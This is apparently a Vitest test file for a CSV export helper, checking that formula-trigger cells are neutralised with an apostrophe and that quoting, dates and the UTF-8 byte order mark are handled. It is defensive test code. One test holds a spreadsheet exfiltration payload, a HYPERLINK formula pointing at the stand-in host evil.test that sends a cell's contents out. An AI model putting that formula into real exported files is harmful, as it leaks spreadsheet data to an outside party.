import { describe, expect, it } from 'vitest'

import { csvBlob, csvCell, csvTable } from './csv-export'

describe('csvCell', () => {
  it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\t=1', '\r=1'])(
    'neutralises the formula trigger in the text %j with a leading apostrophe',
    (text) => {
      expect(csvCell(text).replace(/^"|"$/g, '')).toBe(`'${text}`)
    },
  )

  it('looks past leading spaces and tabs, and leaves a number with spaces alone', () => {
    expect(csvCell('  =1+1')).toBe("'  =1+1")
    expect(csvCell(' \t@SUM(A1)')).toBe("' \t@SUM(A1)")
    expect(csvCell('  texto')).toBe('  texto')
    expect(csvCell(-5)).toBe('-5')
  })

  it('neutralises the classic exfiltration payload', () => {
    expect(csvCell('=HYPERLINK("http://evil.test/?x="&A1,"ok")')).toBe(
      `"'=HYPERLINK(""http://evil.test/?x=""&A1,""ok"")"`,
    )
  })

  it('leaves a real number alone, so a negative still sums, but not the text that looks like one', () => {
    expect(csvCell(-5)).toBe('-5')
    expect(csvCell(3.14)).toBe('3.14')
    expect(csvCell('-5')).toBe("'-5")
  })

  it('does not touch text that only has a trigger inside', () => {
    expect(csvCell('a=b')).toBe('a=b')
    expect(csvCell('2026-11-21')).toBe('2026-11-21')
  })

  it('quotes a cell with a comma, a quote or a line break, and doubles the quotes', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('diz "oi"')).toBe('"diz ""oi"""')
    expect(csvCell('linha\nnova')).toBe('"linha\nnova"')
    expect(csvCell('linha\rnova')).toBe('"linha\rnova"')
  })

  it('an empty cell is empty text, and a date is its ISO instant', () => {
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
    expect(csvCell(new Date('2026-11-21T10:00:00.000Z'))).toBe(
      '2026-11-21T10:00:00.000Z',
    )
  })
})

describe('csvTable', () => {
  it('joins the cells with a comma and the rows with CRLF', () => {
    expect(
      csvTable([
        ['Nome', 'Quantia'],
        ['=cmd', 12],
        ['Ana, Maria', -3],
      ]),
    ).toBe(`Nome,Quantia\r\n'=cmd,12\r\n"Ana, Maria",-3`)
  })
})

describe('csvBlob', () => {
  it('is UTF-8 CSV that starts with the byte order mark, so Excel keeps the accents', async () => {
    const blob = csvBlob([['ação']])
    const bytes = new Uint8Array(await blob.arrayBuffer())

    expect(blob.type).toBe('text/csv;charset=utf-8')
    expect(Array.from(bytes.slice(0, 3))).toEqual([0xef, 0xbb, 0xbf])
    expect(new TextDecoder().decode(bytes.slice(3))).toBe('ação')
  })
})

describe('csvCell with an object', () => {
  it('writes its JSON and never [object Object]', () => {
    expect(csvCell({ id: 1 })).toBe('"{""id"":1}"')
  })
})
